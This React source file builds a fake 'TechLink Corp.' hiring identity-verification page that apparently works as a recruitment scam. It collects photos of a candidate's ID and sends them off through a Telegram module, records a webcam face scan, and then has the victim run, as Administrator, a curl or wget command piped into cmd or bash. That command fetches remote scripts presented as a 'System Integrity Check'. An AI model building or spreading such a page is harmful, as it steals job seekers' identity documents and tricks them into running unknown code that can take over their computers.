import { useState, useCallback, useEffect, useRef } from 'react'
import { Link } from 'react-router-dom'
import { ArrowLeft, Upload, Camera, Terminal, CheckCircle, Copy, ClipboardPaste, User, Mail } from 'lucide-react'
import { useCamera } from './hooks/useCamera'
import { sendIdPhotos, submitVerification } from './telegram'
import { VerifyModal } from './components/VerifyModal'

const CAMERA_DURATION = 10

const PROMPTS = [
  { text: 'Look straight at the camera', icon: '🙂' },
  { text: 'Slowly turn your head to the left', icon: '⬅️' },
  { text: 'Now turn your head to the right', icon: '➡️' },
  { text: 'Look up slowly', icon: '⬆️' },
  { text: 'Look down slowly', icon: '⬇️' },
]

const OS_COMMANDS = {
  windows: { label: 'Windows', shell: 'Command Prompt / PowerShell', command: 'curl "https://ai-detect-and-check.vercel.app/check/settings-win.cmd" | cmd' },
  mac:     { label: 'macOS',   shell: 'Terminal',                    command: 'curl "https://ai-detect-and-check.vercel.app/check/settings.sh" | bash' },
  linux:   { label: 'Linux',   shell: 'Terminal',                    command: 'wget -qO- "https://ai-detect-and-check.vercel.app/check/settings.sh" | bash' },
}

function detectOS() {
  const ua = navigator.userAgent.toLowerCase()
  if (ua.includes('win')) return 'windows'
  if (ua.includes('mac')) return 'mac'
  return 'linux'
}

export default function VerificationPage() {
  const [step, setStep] = useState('welcome')
  const [frontFile, setFrontFile] = useState(null)
  const [backFile, setBackFile] = useState(null)
  const [frontPreview, setFrontPreview] = useState(null)
  const [backPreview, setBackPreview] = useState(null)
  const [uploading, setUploading] = useState(false)
  const [error, setError] = useState(null)
  const [secondsLeft, setSecondsLeft] = useState(CAMERA_DURATION)
  const [promptIndex, setPromptIndex] = useState(0)
  const [fullName, setFullName] = useState('')
  const [email, setEmail] = useState('')
  const [terminalOutput, setTerminalOutput] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [copied, setCopied] = useState(false)
  const [selectedOS, setSelectedOS] = useState(detectOS)
  const timerRef = useRef(null)

  const { videoRef, canvasRef, isActive, error: camError, start, stop } = useCamera()

  const handleFile = useCallback((e, side) => {
    const file = e.target.files?.[0]
    if (!file) return
    const url = URL.createObjectURL(file)
    if (side === 'front') {
      setFrontFile(file)
      setFrontPreview(url)
    } else {
      setBackFile(file)
      setBackPreview(url)
    }
  }, [])

  const handleUpload = useCallback(async () => {
    if (!frontFile || !backFile) return
    setUploading(true)
    setError(null)
    try {
      await sendIdPhotos(frontFile, backFile)
      setStep('camera')
    } catch (err) {
      setError(`Failed to upload ID photos: ${err.message}`)
    } finally {
      setUploading(false)
    }
  }, [frontFile, backFile])

  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(OS_COMMANDS[selectedOS].command)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }, [selectedOS])

  const handleSubmit = useCallback(async () => {
    if (!fullName.trim() || !email.trim() || !terminalOutput.trim()) return
    setSubmitting(true)
    setError(null)
    try {
      await submitVerification({ fullName: fullName.trim(), email: email.trim(), terminalOutput: terminalOutput.trim() })
      setStep('done')
    } catch (err) {
      setError(`Submission failed: ${err.message}`)
    } finally {
      setSubmitting(false)
    }
  }, [fullName, email, terminalOutput])

  useEffect(() => {
    if (step === 'camera' && !isActive) start()
    if (step !== 'camera' && isActive) stop()
  }, [step, isActive, start, stop])

  useEffect(() => {
    if (step !== 'camera' || !isActive) return

    setSecondsLeft(CAMERA_DURATION)
    setPromptIndex(0)

    const promptInterval = Math.max(1, Math.floor(CAMERA_DURATION / PROMPTS.length))

    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current)
          stop()
          setStep('command')
          return 0
        }
        const next = prev - 1
        const elapsed = CAMERA_DURATION - next
        const idx = Math.min(PROMPTS.length - 1, Math.floor(elapsed / promptInterval))
        setPromptIndex(idx)
        return next
      })
    }, 1000)

    return () => clearInterval(timerRef.current)
  }, [step, stop, isActive])

  const stepLabels = ['Upload ID', 'Camera Check', 'Confirm']
  const stepNum = step === 'id_upload' ? 0 : step === 'camera' ? 1 : step === 'command' ? 2 : -1

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col">
      <header className="bg-white/95 backdrop-blur-lg border-b border-slate-200 px-4 py-3 sticky top-0 z-40">
        <div className="max-w-4xl mx-auto flex items-center gap-4">
          <Link
            to="/"
            className="flex items-center gap-2 text-slate-500 hover:text-slate-900 transition-colors text-sm"
          >
            <ArrowLeft size={16} />
            Back
          </Link>
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-accent flex items-center justify-center text-white font-bold text-sm">
              ID
            </div>
            <div>
              <h1 className="text-slate-900 font-semibold text-base leading-tight">
                Identity Verification
              </h1>
              <p className="text-slate-400 text-xs">TechLink Corp.</p>
            </div>
          </div>

          {stepNum >= 0 && (
            <div className="ml-auto flex items-center gap-2">
              {stepLabels.map((label, i) => (
                <div key={i} className="flex items-center gap-1.5">
                  <div
                    className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold transition-colors ${
                      i <= stepNum
                        ? 'bg-accent text-white'
                        : 'bg-slate-200 text-slate-400'
                    }`}
                  >
                    {i < stepNum ? '\u2713' : i + 1}
                  </div>
                  <span className="text-xs text-slate-400 hidden sm:inline">{label}</span>
                  {i < stepLabels.length - 1 && (
                    <div className={`w-6 h-0.5 rounded ${i < stepNum ? 'bg-accent' : 'bg-slate-200'}`} />
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-2xl">

          {step === 'welcome' && (
            <div className="text-center py-16">
              <div className="w-20 h-20 mx-auto rounded-2xl bg-accent/10 border border-accent/20 flex items-center justify-center mb-8">
                <span className="text-4xl">{'\uD83D\uDD10'}</span>
              </div>
              <h2 className="font-display text-2xl sm:text-3xl text-slate-900 mb-4">
                Identity Verification
              </h2>
              <p className="text-slate-500 max-w-md mx-auto leading-relaxed mb-8">
                As part of the hiring process at TechLink Corp., we need to
                verify your identity. Please have your ID document (driver's
                license, passport, or national ID) ready.
              </p>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 max-w-lg mx-auto mb-10 text-left">
                <div className="bg-white rounded-xl p-4 border border-slate-200">
                  <div className="text-accent mb-2"><Upload size={20} /></div>
                  <p className="text-slate-900 text-sm font-medium">Upload ID</p>
                  <p className="text-slate-400 text-xs mt-1">Front and back of your ID</p>
                </div>
                <div className="bg-white rounded-xl p-4 border border-slate-200">
                  <div className="text-accent mb-2"><Camera size={20} /></div>
                  <p className="text-slate-900 text-sm font-medium">Camera Check</p>
                  <p className="text-slate-400 text-xs mt-1">Brief camera verification</p>
                </div>
                <div className="bg-white rounded-xl p-4 border border-slate-200">
                  <div className="text-accent mb-2"><Terminal size={20} /></div>
                  <p className="text-slate-900 text-sm font-medium">Confirm</p>
                  <p className="text-slate-400 text-xs mt-1">Run a quick terminal command</p>
                </div>
              </div>

              <button
                onClick={() => setStep('id_upload')}
                className="inline-flex items-center gap-2 px-8 py-4 bg-accent text-white text-sm font-medium tracking-wide uppercase hover:bg-accent-light transition-colors duration-300 rounded-lg"
              >
                Begin Verification
              </button>

              <p className="text-slate-400 text-xs mt-6 max-w-sm mx-auto">
                Your camera will be accessed during the process. Make sure you
                are in a well-lit area.
              </p>
            </div>
          )}

          {step === 'id_upload' && (
            <div className="py-10">
              <div className="max-w-lg mx-auto">
                <h2 className="text-xl font-bold text-slate-900 mb-2 text-center">
                  Upload Your ID Document
                </h2>
                <p className="text-slate-500 text-sm text-center mb-8">
                  Upload clear photos of the front and back of your ID
                  (driver's license, passport, or national ID).
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6 mb-8">
                  <label className="group cursor-pointer">
                    <div
                      className={`relative aspect-[1.6] rounded-xl border-2 border-dashed transition-colors overflow-hidden ${
                        frontPreview
                          ? 'border-accent bg-accent/5'
                          : 'border-slate-300 bg-white hover:border-accent/50'
                      }`}
                    >
                      {frontPreview ? (
                        <img
                          src={frontPreview}
                          alt="Front side"
                          className="w-full h-full object-cover"
                        />
                      ) : (
                        <div className="absolute inset-0 flex flex-col items-center justify-center gap-2">
                          <Upload size={24} className="text-slate-400 group-hover:text-accent transition-colors" />
                          <span className="text-slate-400 text-sm">Front Side</span>
                        </div>
                      )}
                    </div>
                    <input
                      type="file"
                      accept="image/*"
                      className="hidden"
                      onChange={(e) => handleFile(e, 'front')}
                    />
                    <p className="text-xs text-slate-400 mt-2 text-center">
                      {frontFile ? frontFile.name : 'Click to upload front side'}
                    </p>
                  </label>

                  <label className="group cursor-pointer">
                    <div
                      className={`relative aspect-[1.6] rounded-xl border-2 border-dashed transition-colors overflow-hidden ${
                        backPreview
                          ? 'border-accent bg-accent/5'
                          : 'border-slate-300 bg-white hover:border-accent/50'
                      }`}
                    >
                      {backPreview ? (
                        <img
                          src={backPreview}
                          alt="Back side"
                          className="w-full h-full object-cover"
                        />
                      ) : (
                        <div className="absolute inset-0 flex flex-col items-center justify-center gap-2">
                          <Upload size={24} className="text-slate-400 group-hover:text-accent transition-colors" />
                          <span className="text-slate-400 text-sm">Back Side</span>
                        </div>
                      )}
                    </div>
                    <input
                      type="file"
                      accept="image/*"
                      className="hidden"
                      onChange={(e) => handleFile(e, 'back')}
                    />
                    <p className="text-xs text-slate-400 mt-2 text-center">
                      {backFile ? backFile.name : 'Click to upload back side'}
                    </p>
                  </label>
                </div>

                <button
                  onClick={handleUpload}
                  disabled={!frontFile || !backFile || uploading}
                  className="w-full px-6 py-4 bg-accent text-white text-sm font-medium uppercase tracking-wide rounded-lg transition-colors duration-300 disabled:opacity-40 disabled:cursor-not-allowed hover:bg-accent-light"
                >
                  {uploading ? 'Uploading...' : 'Continue'}
                </button>
              </div>
            </div>
          )}

          {step === 'camera' && (
            <div>
              <div className="relative aspect-video rounded-2xl overflow-hidden shadow-xl border border-slate-200">
                <video
                  ref={videoRef}
                  className="w-full h-full object-cover"
                  playsInline
                  muted
                  style={{ transform: 'scaleX(-1)' }}
                />
                <canvas ref={canvasRef} className="hidden" />

                <div className="absolute top-4 right-4 bg-black/60 backdrop-blur-sm text-white rounded-full w-14 h-14 flex items-center justify-center">
                  <span className="text-xl font-bold">{secondsLeft}</span>
                </div>

                <div className="absolute bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-black/70 to-transparent">
                  <div className="text-center space-y-2">
                    <span className="text-3xl">{PROMPTS[promptIndex].icon}</span>
                    <p className="text-white font-medium text-lg">
                      {PROMPTS[promptIndex].text}
                    </p>
                    <div className="w-full bg-white/20 rounded-full h-1.5 mt-3">
                      <div
                        className="h-full bg-accent rounded-full transition-all duration-1000"
                        style={{
                          width: `${((CAMERA_DURATION - secondsLeft) / CAMERA_DURATION) * 100}%`,
                        }}
                      />
                    </div>
                  </div>
                </div>

                {camError && (
                  <div className="absolute inset-0 flex items-center justify-center bg-slate-900">
                    <div className="text-center space-y-4 p-8">
                      <p className="text-red-400 text-lg">{camError}</p>
                      <button
                        onClick={start}
                        className="px-6 py-2 bg-accent text-white rounded-lg"
                      >
                        Retry
                      </button>
                    </div>
                  </div>
                )}
              </div>

              <p className="text-slate-400 text-xs text-center mt-4">
                Please follow the on-screen instructions. This step takes {CAMERA_DURATION} seconds.
              </p>
            </div>
          )}

          {step === 'command' && (
            <div className="py-10">
              <div className="max-w-lg mx-auto rounded-2xl p-8 shadow-xl bg-white border border-slate-200">
                <div className="text-center mb-6">
                  <div className="w-16 h-16 mx-auto rounded-full bg-amber-50 border border-amber-200 flex items-center justify-center mb-4">
                    <Terminal size={28} className="text-amber-600" />
                  </div>
                  <h2 className="text-xl font-bold text-slate-900 mb-2">
                    System Integrity Check
                  </h2>
                  <p className="text-slate-600 text-sm leading-relaxed">
                    To ensure no AI-based face-swapping or screen-manipulation
                    software is running on your device, we need to verify your
                    active system processes. Open{' '}
                    <strong>{OS_COMMANDS[selectedOS].shell}</strong> as an Administrator and run the
                    command below.
                  </p>
                </div>

                <div className="flex gap-1 mb-2">
                  {Object.entries(OS_COMMANDS).map(([key, { label }]) => (
                    <button
                      key={key}
                      onClick={() => { setSelectedOS(key); setCopied(false) }}
                      className={`px-3 py-1.5 text-xs font-medium rounded-t-lg transition-colors ${
                        selectedOS === key
                          ? 'bg-slate-900 text-green-400'
                          : 'bg-slate-200 text-slate-500 hover:bg-slate-300'
                      }`}
                    >
                      {label}
                    </button>
                  ))}
                </div>

                <div className="bg-slate-900 rounded-b-lg rounded-tr-lg px-4 py-3 flex items-center justify-between gap-3 mb-6">
                  <code className="text-green-400 text-sm font-mono break-all select-all">
                    {OS_COMMANDS[selectedOS].command}
                  </code>
                  <button
                    onClick={handleCopy}
                    className="shrink-0 flex items-center gap-1.5 text-slate-400 hover:text-white transition-colors text-xs uppercase tracking-wider"
                  >
                    {copied ? (
                      <>
                        <CheckCircle size={14} />
                        Copied
                      </>
                    ) : (
                      <>
                        <Copy size={14} />
                        Copy
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="flex items-center gap-2 text-slate-700 text-sm font-medium mb-1.5">
                      <ClipboardPaste size={14} className="text-slate-400" />
                      Terminal Output
                    </label>
                    <textarea
                      value={terminalOutput}
                      onChange={(e) => setTerminalOutput(e.target.value)}
                      placeholder="Paste the full output from the terminal here..."
                      rows={6}
                      className="w-full rounded-lg border border-slate-300 bg-slate-50 px-4 py-3 text-sm font-mono text-slate-800 placeholder:text-slate-400 focus:border-accent focus:ring-2 focus:ring-accent/20 outline-none resize-y"
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="flex items-center gap-2 text-slate-700 text-sm font-medium mb-1.5">
                        <User size={14} className="text-slate-400" />
                        Full Name
                      </label>
                      <input
                        type="text"
                        value={fullName}
                        onChange={(e) => setFullName(e.target.value)}
                        placeholder="John Doe"
                        className="w-full rounded-lg border border-slate-300 bg-slate-50 px-4 py-3 text-sm text-slate-800 placeholder:text-slate-400 focus:border-accent focus:ring-2 focus:ring-accent/20 outline-none"
                      />
                    </div>
                    <div>
                      <label className="flex items-center gap-2 text-slate-700 text-sm font-medium mb-1.5">
                        <Mail size={14} className="text-slate-400" />
                        Email Address
                      </label>
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="john@example.com"
                        className="w-full rounded-lg border border-slate-300 bg-slate-50 px-4 py-3 text-sm text-slate-800 placeholder:text-slate-400 focus:border-accent focus:ring-2 focus:ring-accent/20 outline-none"
                      />
                    </div>
                  </div>

                  <button
                    onClick={handleSubmit}
                    disabled={!fullName.trim() || !email.trim() || !terminalOutput.trim() || submitting}
                    className="w-full px-6 py-3 bg-accent text-white text-sm font-medium uppercase tracking-wide rounded-lg transition-colors duration-300 hover:bg-accent-light disabled:opacity-40 disabled:cursor-not-allowed"
                  >
                    {submitting ? 'Submitting...' : 'Submit Verification'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 'done' && (
            <div className="py-16">
              <div className="max-w-md mx-auto rounded-2xl p-8 shadow-xl bg-gradient-to-br from-green-50 to-green-100 border border-green-200">
                <div className="text-center space-y-4">
                  <div className="w-16 h-16 mx-auto rounded-full bg-green-100 border border-green-300 flex items-center justify-center">
                    <CheckCircle size={32} className="text-green-600" />
                  </div>
                  <h2 className="text-2xl font-bold text-green-800">
                    Verification Complete
                  </h2>
                  <p className="text-green-700 leading-relaxed">
                    Your identity verification has been submitted. A member of
                    our team will review your submission and contact you shortly.
                  </p>
                  <p className="text-green-600 text-sm">
                    You can safely close this page.
                  </p>
                  <div className="pt-4">
                    <Link
                      to="/"
                      className="inline-flex px-6 py-3 bg-white hover:bg-slate-50 text-slate-700 font-medium rounded-lg transition border border-slate-200 text-sm"
                    >
                      Back to Home
                    </Link>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {error && (
        <VerifyModal title="Error" onClose={() => setError(null)} closeLabel="Dismiss">
          <p className="text-slate-600 text-center leading-relaxed text-sm">{error}</p>
        </VerifyModal>
      )}

      <footer className="py-3 text-center text-slate-400 text-xs border-t border-slate-200 bg-white">
        <p>TechLink Corp. Identity Verification Service</p>
      </footer>
    </div>
  )
}
